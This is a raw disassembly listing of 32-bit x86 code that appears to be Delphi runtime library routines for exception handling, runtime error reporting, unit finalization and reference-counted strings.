  403003:	b8 01 00 00 00       	mov    $0x1,%eax
  403008:	c3                   	ret
  403009:	8d 40 00             	lea    0x0(%eax),%eax
  40300c:	e8 df 1c 00 00       	call   0x404cf0
  403011:	8b 90 20 c6 41 00    	mov    0x41c620(%eax),%edx
  403017:	8b 0a                	mov    (%edx),%ecx
  403019:	89 88 20 c6 41 00    	mov    %ecx,0x41c620(%eax)
  40301f:	8b 42 08             	mov    0x8(%edx),%eax
  403022:	e8 d5 fb ff ff       	call   0x402bfc
  403027:	5a                   	pop    %edx
  403028:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  40302c:	31 c0                	xor    %eax,%eax
  40302e:	59                   	pop    %ecx
  40302f:	64 89 08             	mov    %ecx,%fs:(%eax)
  403032:	58                   	pop    %eax
  403033:	5d                   	pop    %ebp
  403034:	e8 df fd ff ff       	call   0x402e18
  403039:	ff e2                	jmp    *%edx
  40303b:	c3                   	ret
  40303c:	31 d2                	xor    %edx,%edx
  40303e:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403042:	8b 44 24 04          	mov    0x4(%esp),%eax
  403046:	83 c1 05             	add    $0x5,%ecx
  403049:	64 89 02             	mov    %eax,%fs:(%edx)
  40304c:	ff d1                	call   *%ecx
  40304e:	c2 0c 00             	ret    $0xc
  403051:	c3                   	ret
  403052:	8b c0                	mov    %eax,%eax
  403054:	55                   	push   %ebp
  403055:	8b ec                	mov    %esp,%ebp
  403057:	8b 55 08             	mov    0x8(%ebp),%edx
  40305a:	8b 02                	mov    (%edx),%eax
  40305c:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  403061:	7f 2c                	jg     0x40308f
  403063:	74 5c                	je     0x4030c1
  403065:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  40306a:	7f 15                	jg     0x403081
  40306c:	74 57                	je     0x4030c5
  40306e:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  403073:	74 5c                	je     0x4030d1
  403075:	2d 87 00 00 00       	sub    $0x87,%eax
  40307a:	74 3d                	je     0x4030b9
  40307c:	48                   	dec    %eax
  40307d:	74 4e                	je     0x4030cd
  40307f:	eb 60                	jmp    0x4030e1
  403081:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  403086:	83 e8 02             	sub    $0x2,%eax
  403089:	72 36                	jb     0x4030c1
  40308b:	74 30                	je     0x4030bd
  40308d:	eb 52                	jmp    0x4030e1
  40308f:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  403094:	7f 11                	jg     0x4030a7
  403096:	74 3d                	je     0x4030d5
  403098:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  40309d:	74 2e                	je     0x4030cd
  40309f:	48                   	dec    %eax
  4030a0:	74 13                	je     0x4030b5
  4030a2:	48                   	dec    %eax
  4030a3:	74 24                	je     0x4030c9
  4030a5:	eb 3a                	jmp    0x4030e1
  4030a7:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  4030ac:	74 2f                	je     0x4030dd
  4030ae:	83 e8 3d             	sub    $0x3d,%eax
  4030b1:	74 26                	je     0x4030d9
  4030b3:	eb 2c                	jmp    0x4030e1
  4030b5:	b0 c8                	mov    $0xc8,%al
  4030b7:	eb 2a                	jmp    0x4030e3
  4030b9:	b0 c9                	mov    $0xc9,%al
  4030bb:	eb 26                	jmp    0x4030e3
  4030bd:	b0 cd                	mov    $0xcd,%al
  4030bf:	eb 22                	jmp    0x4030e3
  4030c1:	b0 cf                	mov    $0xcf,%al
  4030c3:	eb 1e                	jmp    0x4030e3
  4030c5:	b0 c8                	mov    $0xc8,%al
  4030c7:	eb 1a                	jmp    0x4030e3
  4030c9:	b0 d7                	mov    $0xd7,%al
  4030cb:	eb 16                	jmp    0x4030e3
  4030cd:	b0 ce                	mov    $0xce,%al
  4030cf:	eb 12                	jmp    0x4030e3
  4030d1:	b0 d8                	mov    $0xd8,%al
  4030d3:	eb 0e                	jmp    0x4030e3
  4030d5:	b0 da                	mov    $0xda,%al
  4030d7:	eb 0a                	jmp    0x4030e3
  4030d9:	b0 d9                	mov    $0xd9,%al
  4030db:	eb 06                	jmp    0x4030e3
  4030dd:	b0 ca                	mov    $0xca,%al
  4030df:	eb 02                	jmp    0x4030e3
  4030e1:	b0 ff                	mov    $0xff,%al
  4030e3:	25 ff 00 00 00       	and    $0xff,%eax
  4030e8:	8b 52 0c             	mov    0xc(%edx),%edx
  4030eb:	e8 d0 f4 ff ff       	call   0x4025c0
  4030f0:	5d                   	pop    %ebp
  4030f1:	c2 04 00             	ret    $0x4
  4030f4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4030f8:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4030ff:	0f 85 89 00 00 00    	jne    0x40318e
  403105:	80 3d 1c b0 41 00 00 	cmpb   $0x0,0x41b01c
  40310c:	77 0f                	ja     0x40311d
  40310e:	8d 44 24 04          	lea    0x4(%esp),%eax
  403112:	50                   	push   %eax
  403113:	e8 b0 df ff ff       	call   0x4010c8
  403118:	83 f8 00             	cmp    $0x0,%eax
  40311b:	74 71                	je     0x40318e
  40311d:	8b 44 24 04          	mov    0x4(%esp),%eax
  403121:	fc                   	cld
  403122:	e8 61 fa ff ff       	call   0x402b88
  403127:	8b 54 24 08          	mov    0x8(%esp),%edx
  40312b:	6a 00                	push   $0x0
  40312d:	50                   	push   %eax
  40312e:	68 3a 31 40 00       	push   $0x40313a
  403133:	52                   	push   %edx
  403134:	ff 15 14 c0 41 00    	call   *0x41c014
  40313a:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  40313e:	81 3b de fa ed 0e    	cmpl   $0xeedfade,(%ebx)
  403144:	8b 53 14             	mov    0x14(%ebx),%edx
  403147:	8b 43 18             	mov    0x18(%ebx),%eax
  40314a:	74 1d                	je     0x403169
  40314c:	8b 15 0c c0 41 00    	mov    0x41c00c,%edx
  403152:	85 d2                	test   %edx,%edx
  403154:	0f 84 fa fe ff ff    	je     0x403054
  40315a:	89 d8                	mov    %ebx,%eax
  40315c:	ff d2                	call   *%edx
  40315e:	85 c0                	test   %eax,%eax
  403160:	0f 84 ee fe ff ff    	je     0x403054
  403166:	8b 53 0c             	mov    0xc(%ebx),%edx
  403169:	e8 c6 fc ff ff       	call   0x402e34
  40316e:	8b 0d 04 c0 41 00    	mov    0x41c004,%ecx
  403174:	85 c9                	test   %ecx,%ecx
  403176:	74 02                	je     0x40317a
  403178:	ff d1                	call   *%ecx
  40317a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40317e:	b8 d9 00 00 00       	mov    $0xd9,%eax
  403183:	8b 51 14             	mov    0x14(%ecx),%edx
  403186:	89 14 24             	mov    %edx,(%esp)
  403189:	e9 4a 03 00 00       	jmp    0x4034d8
  40318e:	31 c0                	xor    %eax,%eax
  403190:	c3                   	ret
  403191:	8d 40 00             	lea    0x0(%eax),%eax
  403194:	31 d2                	xor    %edx,%edx
  403196:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403199:	64 8b 0a             	mov    %fs:(%edx),%ecx
  40319c:	64 89 02             	mov    %eax,%fs:(%edx)
  40319f:	89 08                	mov    %ecx,(%eax)
  4031a1:	c7 40 04 f4 30 40 00 	movl   $0x4030f4,0x4(%eax)
  4031a8:	89 68 08             	mov    %ebp,0x8(%eax)
  4031ab:	a3 2c c6 41 00       	mov    %eax,0x41c62c
  4031b0:	c3                   	ret
  4031b1:	8d 40 00             	lea    0x0(%eax),%eax
  4031b4:	31 d2                	xor    %edx,%edx
  4031b6:	a1 2c c6 41 00       	mov    0x41c62c,%eax
  4031bb:	85 c0                	test   %eax,%eax
  4031bd:	74 1c                	je     0x4031db
  4031bf:	64 8b 0a             	mov    %fs:(%edx),%ecx
  4031c2:	39 c8                	cmp    %ecx,%eax
  4031c4:	75 08                	jne    0x4031ce
  4031c6:	8b 00                	mov    (%eax),%eax
  4031c8:	64 89 02             	mov    %eax,%fs:(%edx)
  4031cb:	c3                   	ret
  4031cc:	8b 09                	mov    (%ecx),%ecx
  4031ce:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4031d1:	74 08                	je     0x4031db
  4031d3:	39 01                	cmp    %eax,(%ecx)
  4031d5:	75 f5                	jne    0x4031cc
  4031d7:	8b 00                	mov    (%eax),%eax
  4031d9:	89 01                	mov    %eax,(%ecx)
  4031db:	c3                   	ret
  4031dc:	55                   	push   %ebp
  4031dd:	8b ec                	mov    %esp,%ebp
  4031df:	53                   	push   %ebx
  4031e0:	56                   	push   %esi
  4031e1:	57                   	push   %edi
  4031e2:	bf 28 c6 41 00       	mov    $0x41c628,%edi
  4031e7:	8b 47 08             	mov    0x8(%edi),%eax
  4031ea:	85 c0                	test   %eax,%eax
  4031ec:	74 48                	je     0x403236
  4031ee:	8b 5f 0c             	mov    0xc(%edi),%ebx
  4031f1:	8b 70 04             	mov    0x4(%eax),%esi
  4031f4:	33 d2                	xor    %edx,%edx
  4031f6:	55                   	push   %ebp
  4031f7:	68 22 32 40 00       	push   $0x403222
  4031fc:	64 ff 32             	push   %fs:(%edx)
  4031ff:	64 89 22             	mov    %esp,%fs:(%edx)
  403202:	85 db                	test   %ebx,%ebx
  403204:	7e 12                	jle    0x403218
  403206:	4b                   	dec    %ebx
  403207:	89 5f 0c             	mov    %ebx,0xc(%edi)
  40320a:	8b 44 de 04          	mov    0x4(%esi,%ebx,8),%eax
  40320e:	85 c0                	test   %eax,%eax
  403210:	74 02                	je     0x403214
  403212:	ff d0                	call   *%eax
  403214:	85 db                	test   %ebx,%ebx
  403216:	7f ee                	jg     0x403206
  403218:	33 c0                	xor    %eax,%eax
  40321a:	5a                   	pop    %edx
  40321b:	59                   	pop    %ecx
  40321c:	59                   	pop    %ecx
  40321d:	64 89 10             	mov    %edx,%fs:(%eax)
  403220:	eb 14                	jmp    0x403236
  403222:	e9 2d fc ff ff       	jmp    0x402e54
  403227:	e8 b0 ff ff ff       	call   0x4031dc
  40322c:	e8 87 fd ff ff       	call   0x402fb8
  403231:	e8 d6 fd ff ff       	call   0x40300c
  403236:	5f                   	pop    %edi
  403237:	5e                   	pop    %esi
  403238:	5b                   	pop    %ebx
  403239:	5d                   	pop    %ebp
  40323a:	c3                   	ret
  40323b:	90                   	nop
  40323c:	55                   	push   %ebp
  40323d:	8b ec                	mov    %esp,%ebp
  40323f:	53                   	push   %ebx
  403240:	56                   	push   %esi
  403241:	57                   	push   %edi
  403242:	a1 30 c6 41 00       	mov    0x41c630,%eax
  403247:	85 c0                	test   %eax,%eax
  403249:	74 4b                	je     0x403296
  40324b:	8b 30                	mov    (%eax),%esi
  40324d:	33 db                	xor    %ebx,%ebx
  40324f:	8b 78 04             	mov    0x4(%eax),%edi
  403252:	33 d2                	xor    %edx,%edx
  403254:	55                   	push   %ebp
  403255:	68 82 32 40 00       	push   $0x403282
  40325a:	64 ff 32             	push   %fs:(%edx)
  40325d:	64 89 22             	mov    %esp,%fs:(%edx)
  403260:	3b f3                	cmp    %ebx,%esi
  403262:	7e 14                	jle    0x403278
  403264:	8b 04 df             	mov    (%edi,%ebx,8),%eax
  403267:	43                   	inc    %ebx
  403268:	89 1d 34 c6 41 00    	mov    %ebx,0x41c634
  40326e:	85 c0                	test   %eax,%eax
  403270:	74 02                	je     0x403274
  403272:	ff d0                	call   *%eax
  403274:	3b f3                	cmp    %ebx,%esi
  403276:	7f ec                	jg     0x403264
  403278:	33 c0                	xor    %eax,%eax
  40327a:	5a                   	pop    %edx
  40327b:	59                   	pop    %ecx
  40327c:	59                   	pop    %ecx
  40327d:	64 89 10             	mov    %edx,%fs:(%eax)
  403280:	eb 14                	jmp    0x403296
  403282:	e9 cd fb ff ff       	jmp    0x402e54
  403287:	e8 50 ff ff ff       	call   0x4031dc
  40328c:	e8 27 fd ff ff       	call   0x402fb8
  403291:	e8 76 fd ff ff       	call   0x40300c
  403296:	5f                   	pop    %edi
  403297:	5e                   	pop    %esi
  403298:	5b                   	pop    %ebx
  403299:	5d                   	pop    %ebp
  40329a:	c3                   	ret
  40329b:	90                   	nop
  40329c:	c7 05 10 c0 41 00 b8 	movl   $0x4010b8,0x41c010
  4032a3:	10 40 00 
  4032a6:	c7 05 14 c0 41 00 c0 	movl   $0x4010c0,0x41c014
  4032ad:	10 40 00 
  4032b0:	a3 30 c6 41 00       	mov    %eax,0x41c630
  4032b5:	33 c0                	xor    %eax,%eax
  4032b7:	a3 34 c6 41 00       	mov    %eax,0x41c634
  4032bc:	89 15 38 c6 41 00    	mov    %edx,0x41c638
  4032c2:	8b 42 04             	mov    0x4(%edx),%eax
  4032c5:	a3 1c c0 41 00       	mov    %eax,0x41c01c
  4032ca:	e8 c5 fe ff ff       	call   0x403194
  4032cf:	c6 05 24 c0 41 00 00 	movb   $0x0,0x41c024
  4032d6:	e8 61 ff ff ff       	call   0x40323c
  4032db:	c3                   	ret
  4032dc:	53                   	push   %ebx
  4032dd:	56                   	push   %esi
  4032de:	57                   	push   %edi
  4032df:	be 60 b0 41 00       	mov    $0x41b060,%esi
  4032e4:	b1 10                	mov    $0x10,%cl
  4032e6:	8b 1d 00 b0 41 00    	mov    0x41b000,%ebx
  4032ec:	8b c3                	mov    %ebx,%eax
  4032ee:	bf 0a 00 00 00       	mov    $0xa,%edi
  4032f3:	99                   	cltd
  4032f4:	f7 ff                	idiv   %edi
  4032f6:	80 c2 30             	add    $0x30,%dl
  4032f9:	33 c0                	xor    %eax,%eax
  4032fb:	8a c1                	mov    %cl,%al
  4032fd:	88 14 06             	mov    %dl,(%esi,%eax,1)
  403300:	8b c3                	mov    %ebx,%eax
  403302:	bb 0a 00 00 00       	mov    $0xa,%ebx
  403307:	99                   	cltd
  403308:	f7 fb                	idiv   %ebx
  40330a:	8b d8                	mov    %eax,%ebx
  40330c:	49                   	dec    %ecx
  40330d:	85 db                	test   %ebx,%ebx
  40330f:	75 db                	jne    0x4032ec
  403311:	b1 1c                	mov    $0x1c,%cl
  403313:	a1 04 b0 41 00       	mov    0x41b004,%eax
  403318:	8b d0                	mov    %eax,%edx
  40331a:	83 e2 0f             	and    $0xf,%edx
  40331d:	8a 92 80 b0 41 00    	mov    0x41b080(%edx),%dl
  403323:	33 db                	xor    %ebx,%ebx
  403325:	8a d9                	mov    %cl,%bl
  403327:	88 14 1e             	mov    %dl,(%esi,%ebx,1)
  40332a:	c1 e8 04             	shr    $0x4,%eax
  40332d:	49                   	dec    %ecx
  40332e:	85 c0                	test   %eax,%eax
  403330:	75 e6                	jne    0x403318
  403332:	5f                   	pop    %edi
  403333:	5e                   	pop    %esi
  403334:	5b                   	pop    %ebx
  403335:	c3                   	ret
  403336:	8b c0                	mov    %eax,%eax
  403338:	31 c0                	xor    %eax,%eax
  40333a:	87 05 00 b0 41 00    	xchg   %eax,0x41b000
  403340:	f7 d8                	neg    %eax
  403342:	19 c0                	sbb    %eax,%eax
  403344:	40                   	inc    %eax
  403345:	bf 28 c6 41 00       	mov    $0x41c628,%edi
  40334a:	8b 5f 18             	mov    0x18(%edi),%ebx
  40334d:	8b 6f 14             	mov    0x14(%edi),%ebp
  403350:	ff 77 1c             	push   0x1c(%edi)
  403353:	ff 77 20             	push   0x20(%edi)
  403356:	8b 37                	mov    (%edi),%esi
  403358:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40335d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40335f:	5f                   	pop    %edi
  403360:	5e                   	pop    %esi
  403361:	c9                   	leave
  403362:	c2 0c 00             	ret    $0xc
  403365:	c3                   	ret
  403366:	8b c0                	mov    %eax,%eax
  403368:	51                   	push   %ecx
  403369:	80 3d 34 c0 41 00 00 	cmpb   $0x0,0x41c034
  403370:	74 57                	je     0x4033c9
  403372:	66 81 3d 08 c2 41 00 	cmpw   $0xd7b2,0x41c208
  403379:	b2 d7 
  40337b:	75 14                	jne    0x403391
  40337d:	83 3d 10 c2 41 00 00 	cmpl   $0x0,0x41c210
  403384:	76 0b                	jbe    0x403391
  403386:	b8 04 c2 41 00       	mov    $0x41c204,%eax
  40338b:	ff 15 20 c2 41 00    	call   *0x41c220
  403391:	6a 00                	push   $0x0
  403393:	8d 44 24 04          	lea    0x4(%esp),%eax
  403397:	50                   	push   %eax
  403398:	6a 1e                	push   $0x1e
  40339a:	68 60 b0 41 00       	push   $0x41b060
  40339f:	6a f5                	push   $0xfffffff5
  4033a1:	e8 0a dd ff ff       	call   0x4010b0
  4033a6:	50                   	push   %eax
  4033a7:	e8 24 dd ff ff       	call   0x4010d0
  4033ac:	6a 00                	push   $0x0
  4033ae:	8d 44 24 04          	lea    0x4(%esp),%eax
  4033b2:	50                   	push   %eax
  4033b3:	6a 02                	push   $0x2
  4033b5:	68 f0 33 40 00       	push   $0x4033f0
  4033ba:	6a f5                	push   $0xfffffff5
  4033bc:	e8 ef dc ff ff       	call   0x4010b0
  4033c1:	50                   	push   %eax
  4033c2:	e8 09 dd ff ff       	call   0x4010d0
  4033c7:	5a                   	pop    %edx
  4033c8:	c3                   	ret
  4033c9:	80 3d 24 b0 41 00 00 	cmpb   $0x0,0x41b024
  4033d0:	75 13                	jne    0x4033e5
  4033d2:	6a 00                	push   $0x0
  4033d4:	68 58 b0 41 00       	push   $0x41b058
  4033d9:	68 60 b0 41 00       	push   $0x41b060
  4033de:	6a 00                	push   $0x0
  4033e0:	e8 03 dd ff ff       	call   0x4010e8
  4033e5:	5a                   	pop    %edx
  4033e6:	c3                   	ret
  4033e7:	00 ff                	add    %bh,%bh
  4033e9:	ff                   	(bad)
  4033ea:	ff                   	(bad)
  4033eb:	ff 02                	incl   (%edx)
  4033ed:	00 00                	add    %al,(%eax)
  4033ef:	00 0d 0a 00 00 53    	add    %cl,0x5300000a
  4033f5:	56                   	push   %esi
  4033f6:	57                   	push   %edi
  4033f7:	55                   	push   %ebp
  4033f8:	bb 28 c6 41 00       	mov    $0x41c628,%ebx
  4033fd:	be 00 b0 41 00       	mov    $0x41b000,%esi
  403402:	bf 30 c0 41 00       	mov    $0x41c030,%edi
  403407:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  40340b:	75 16                	jne    0x403423
  40340d:	83 3f 00             	cmpl   $0x0,(%edi)
  403410:	74 11                	je     0x403423
  403412:	8b 17                	mov    (%edi),%edx
  403414:	89 d0                	mov    %edx,%eax
  403416:	33 d2                	xor    %edx,%edx
  403418:	89 17                	mov    %edx,(%edi)
  40341a:	8b e8                	mov    %eax,%ebp
  40341c:	ff d5                	call   *%ebp
  40341e:	83 3f 00             	cmpl   $0x0,(%edi)
  403421:	75 ef                	jne    0x403412
  403423:	83 3d 04 b0 41 00 00 	cmpl   $0x0,0x41b004
  40342a:	74 11                	je     0x40343d
  40342c:	e8 ab fe ff ff       	call   0x4032dc
  403431:	e8 32 ff ff ff       	call   0x403368
  403436:	33 c0                	xor    %eax,%eax
  403438:	a3 04 b0 41 00       	mov    %eax,0x41b004
  40343d:	80 7b 28 02          	cmpb   $0x2,0x28(%ebx)
  403441:	75 0a                	jne    0x40344d
  403443:	83 3e 00             	cmpl   $0x0,(%esi)
  403446:	75 05                	jne    0x40344d
  403448:	33 c0                	xor    %eax,%eax
  40344a:	89 43 0c             	mov    %eax,0xc(%ebx)
  40344d:	e8 8a fd ff ff       	call   0x4031dc
  403452:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  403456:	76 05                	jbe    0x40345d
  403458:	83 3e 00             	cmpl   $0x0,(%esi)
  40345b:	74 21                	je     0x40347e
  40345d:	8b 43 10             	mov    0x10(%ebx),%eax
  403460:	85 c0                	test   %eax,%eax
  403462:	74 1a                	je     0x40347e
  403464:	e8 27 14 00 00       	call   0x404890
  403469:	8b 53 10             	mov    0x10(%ebx),%edx
  40346c:	8b 42 10             	mov    0x10(%edx),%eax
  40346f:	3b 42 04             	cmp    0x4(%edx),%eax
  403472:	74 0a                	je     0x40347e
  403474:	85 c0                	test   %eax,%eax
  403476:	74 06                	je     0x40347e
  403478:	50                   	push   %eax
  403479:	e8 72 dc ff ff       	call   0x4010f0
  40347e:	e8 31 fd ff ff       	call   0x4031b4
  403483:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  403487:	75 03                	jne    0x40348c
  403489:	ff 53 24             	call   *0x24(%ebx)
  40348c:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  403490:	74 05                	je     0x403497
  403492:	e8 a1 fe ff ff       	call   0x403338
  403497:	83 3b 00             	cmpl   $0x0,(%ebx)
  40349a:	75 17                	jne    0x4034b3
  40349c:	83 3d 18 c0 41 00 00 	cmpl   $0x0,0x41c018
  4034a3:	74 06                	je     0x4034ab
  4034a5:	ff 15 18 c0 41 00    	call   *0x41c018
  4034ab:	8b 06                	mov    (%esi),%eax
  4034ad:	50                   	push   %eax
  4034ae:	e8 2d dc ff ff       	call   0x4010e0
  4034b3:	8b 03                	mov    (%ebx),%eax
  4034b5:	56                   	push   %esi
  4034b6:	8b f0                	mov    %eax,%esi
  4034b8:	8b fb                	mov    %ebx,%edi
  4034ba:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4034bf:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4034c1:	5e                   	pop    %esi
  4034c2:	e9 76 ff ff ff       	jmp    0x40343d
  4034c7:	5d                   	pop    %ebp
  4034c8:	5f                   	pop    %edi
  4034c9:	5e                   	pop    %esi
  4034ca:	5b                   	pop    %ebx
  4034cb:	c3                   	ret
  4034cc:	a3 00 b0 41 00       	mov    %eax,0x41b000
  4034d1:	e8 1e ff ff ff       	call   0x4033f4
  4034d6:	c3                   	ret
  4034d7:	90                   	nop
  4034d8:	8f 05 04 b0 41 00    	pop    0x41b004
  4034de:	e9 e9 ff ff ff       	jmp    0x4034cc
  4034e3:	c3                   	ret
  4034e4:	8b 10                	mov    (%eax),%edx
  4034e6:	85 d2                	test   %edx,%edx
  4034e8:	74 1c                	je     0x403506
  4034ea:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4034f0:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4034f3:	49                   	dec    %ecx
  4034f4:	7c 10                	jl     0x403506
  4034f6:	f0 ff 4a f8          	lock decl -0x8(%edx)
  4034fa:	75 0a                	jne    0x403506
  4034fc:	50                   	push   %eax
  4034fd:	8d 42 f8             	lea    -0x8(%edx),%eax
  403500:	e8 4b f0 ff ff       	call   0x402550
  403505:	58                   	pop    %eax
  403506:	c3                   	ret
  403507:	90                   	nop
  403508:	53                   	push   %ebx
  403509:	56                   	push   %esi
  40350a:	89 c3                	mov    %eax,%ebx
  40350c:	89 d6                	mov    %edx,%esi
  40350e:	8b 13                	mov    (%ebx),%edx
  403510:	85 d2                	test   %edx,%edx
  403512:	74 1a                	je     0x40352e
  403514:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  40351a:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40351d:	49                   	dec    %ecx
  40351e:	7c 0e                	jl     0x40352e
  403520:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403524:	75 08                	jne    0x40352e
  403526:	8d 42 f8             	lea    -0x8(%edx),%eax
  403529:	e8 22 f0 ff ff       	call   0x402550
  40352e:	83 c3 04             	add    $0x4,%ebx
  403531:	4e                   	dec    %esi
  403532:	75 da                	jne    0x40350e
  403534:	5e                   	pop    %esi
  403535:	5b                   	pop    %ebx
  403536:	c3                   	ret
  403537:	90                   	nop
  403538:	85 d2                	test   %edx,%edx
  40353a:	74 24                	je     0x403560
  40353c:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40353f:	41                   	inc    %ecx
  403540:	7f 1a                	jg     0x40355c
  403542:	50                   	push   %eax
  403543:	52                   	push   %edx
  403544:	8b 42 fc             	mov    -0x4(%edx),%eax
  403547:	e8 5c 00 00 00       	call   0x4035a8
  40354c:	89 c2                	mov    %eax,%edx
  40354e:	58                   	pop    %eax
  40354f:	52                   	push   %edx
  403550:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403553:	e8 d0 f0 ff ff       	call   0x402628
  403558:	5a                   	pop    %edx
  403559:	58                   	pop    %eax
  40355a:	eb 04                	jmp    0x403560
  40355c:	f0 ff 42 f8          	lock incl -0x8(%edx)
  403560:	87 10                	xchg   %edx,(%eax)
  403562:	85 d2                	test   %edx,%edx
  403564:	74 14                	je     0x40357a
  403566:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403569:	49                   	dec    %ecx
  40356a:	7c 0e                	jl     0x40357a
  40356c:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403570:	75 08                	jne    0x40357a
  403572:	8d 42 f8             	lea    -0x8(%edx),%eax
  403575:	e8 d6 ef ff ff       	call   0x402550
  40357a:	c3                   	ret
  40357b:	90                   	nop
  40357c:	85 d2                	test   %edx,%edx
  40357e:	74 0a                	je     0x40358a
  403580:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403583:	41                   	inc    %ecx
  403584:	7e 04                	jle    0x40358a
  403586:	f0 ff 42 f8          	lock incl -0x8(%edx)
  40358a:	87 10                	xchg   %edx,(%eax)
  40358c:	85 d2                	test   %edx,%edx
  40358e:	74 14                	je     0x4035a4
  403590:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403593:	49                   	dec    %ecx
  403594:	7c 0e                	jl     0x4035a4
  403596:	f0 ff 4a f8          	lock decl -0x8(%edx)
  40359a:	75 08                	jne    0x4035a4
  40359c:	8d 42 f8             	lea    -0x8(%edx),%eax
  40359f:	e8 ac ef ff ff       	call   0x402550
  4035a4:	c3                   	ret
  4035a5:	8d 40 00             	lea    0x0(%eax),%eax
  4035a8:	85 c0                	test   %eax,%eax
  4035aa:	7e 24                	jle    0x4035d0
  4035ac:	50                   	push   %eax
  4035ad:	83 c0 0a             	add    $0xa,%eax
  4035b0:	83 e0 fe             	and    $0xfffffffe,%eax
  4035b3:	50                   	push   %eax
  4035b4:	e8 77 ef ff ff       	call   0x402530
  4035b9:	5a                   	pop    %edx
  4035ba:	66 c7 44 02 fe 00 00 	movw   $0x0,-0x2(%edx,%eax,1)
  4035c1:	83 c0 08             	add    $0x8,%eax
  4035c4:	5a                   	pop    %edx
  4035c5:	89 50 fc             	mov    %edx,-0x4(%eax)
  4035c8:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  4035cf:	c3                   	ret
  4035d0:	31 c0                	xor    %eax,%eax
  4035d2:	c3                   	ret
  4035d3:	90                   	nop
  4035d4:	53                   	push   %ebx
  4035d5:	56                   	push   %esi
  4035d6:	57                   	push   %edi
  4035d7:	89 c3                	mov    %eax,%ebx
  4035d9:	89 d6                	mov    %edx,%esi
  4035db:	89 cf                	mov    %ecx,%edi
  4035dd:	89 f8                	mov    %edi,%eax
  4035df:	e8 c4 ff ff ff       	call   0x4035a8
  4035e4:	89 f9                	mov    %edi,%ecx
  4035e6:	89 c7                	mov    %eax,%edi
  4035e8:	85 f6                	test   %esi,%esi
  4035ea:	74 09                	je     0x4035f5
  4035ec:	89 c2                	mov    %eax,%edx
  4035ee:	89 f0                	mov    %esi,%eax
  4035f0:	e8 33 f0 ff ff       	call   0x402628
  4035f5:	89 d8                	mov    %ebx,%eax
  4035f7:	e8 e8 fe ff ff       	call   0x4034e4
  4035fc:	89 3b                	mov    %edi,(%ebx)
  4035fe:	5f                   	pop    %edi
  4035ff:	5e                   	pop    %esi
  403600:	5b                   	pop    %ebx
  403601:	c3                   	ret
  403602:	8b c0                	mov    %eax,%eax
  403604:	55                   	push   %ebp
  403605:	8b ec                	mov    %esp,%ebp
  403607:	6a 00                	push   $0x0
  403609:	6a 00                	push   $0x0
  40360b:	52                   	push   %edx
  40360c:	50                   	push   %eax
  40360d:	8b 45 08             	mov    0x8(%ebp),%eax
  403610:	50                   	push   %eax
  403611:	51                   	push   %ecx
  403612:	6a 00                	push   $0x0
  403614:	a1 a8 c5 41 00       	mov    0x41c5a8,%eax
  403619:	50                   	push   %eax
  40361a:	e8 21 db ff ff       	call   0x401140
  40361f:	5d                   	pop    %ebp
  403620:	c2 04 00             	ret    $0x4
  403623:	90                   	nop
  403624:	55                   	push   %ebp
  403625:	8b ec                	mov    %esp,%ebp
  403627:	52                   	push   %edx
  403628:	50                   	push   %eax
  403629:	8b 45 08             	mov    0x8(%ebp),%eax
  40362c:	50                   	push   %eax
  40362d:	51                   	push   %ecx
  40362e:	6a 00                	push   $0x0
  403630:	a1 a8 c5 41 00       	mov    0x41c5a8,%eax
  403635:	50                   	push   %eax
  403636:	e8 e5 da ff ff       	call   0x401120
  40363b:	5d                   	pop    %ebp
  40363c:	c2 04 00             	ret    $0x4
  40363f:	90                   	nop
  403640:	53                   	push   %ebx
  403641:	56                   	push   %esi
  403642:	57                   	push   %edi
  403643:	55                   	push   %ebp
  403644:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  40364a:	50                   	push   %eax
  40364b:	83 c4 fc             	add    $0xfffffffc,%esp
  40364e:	8b f1                	mov    %ecx,%esi
  403650:	89 14 24             	mov    %edx,(%esp)
  403653:	8b f8                	mov    %eax,%edi
  403655:	85 f6                	test   %esi,%esi
  403657:	7f 09                	jg     0x403662
  403659:	8b c7                	mov    %edi,%eax
  40365b:	e8 84 fe ff ff       	call   0x4034e4
  403660:	eb 5f                	jmp    0x4036c1
  403662:	8d 6e 01             	lea    0x1(%esi),%ebp
  403665:	81 fd ff 07 00 00    	cmp    $0x7ff,%ebp
  40366b:	7d 28                	jge    0x403695
  40366d:	56                   	push   %esi
  40366e:	8d 44 24 08          	lea    0x8(%esp),%eax
  403672:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403676:	ba ff 0f 00 00       	mov    $0xfff,%edx
  40367b:	e8 84 ff ff ff       	call   0x403604
  403680:	8b d8                	mov    %eax,%ebx
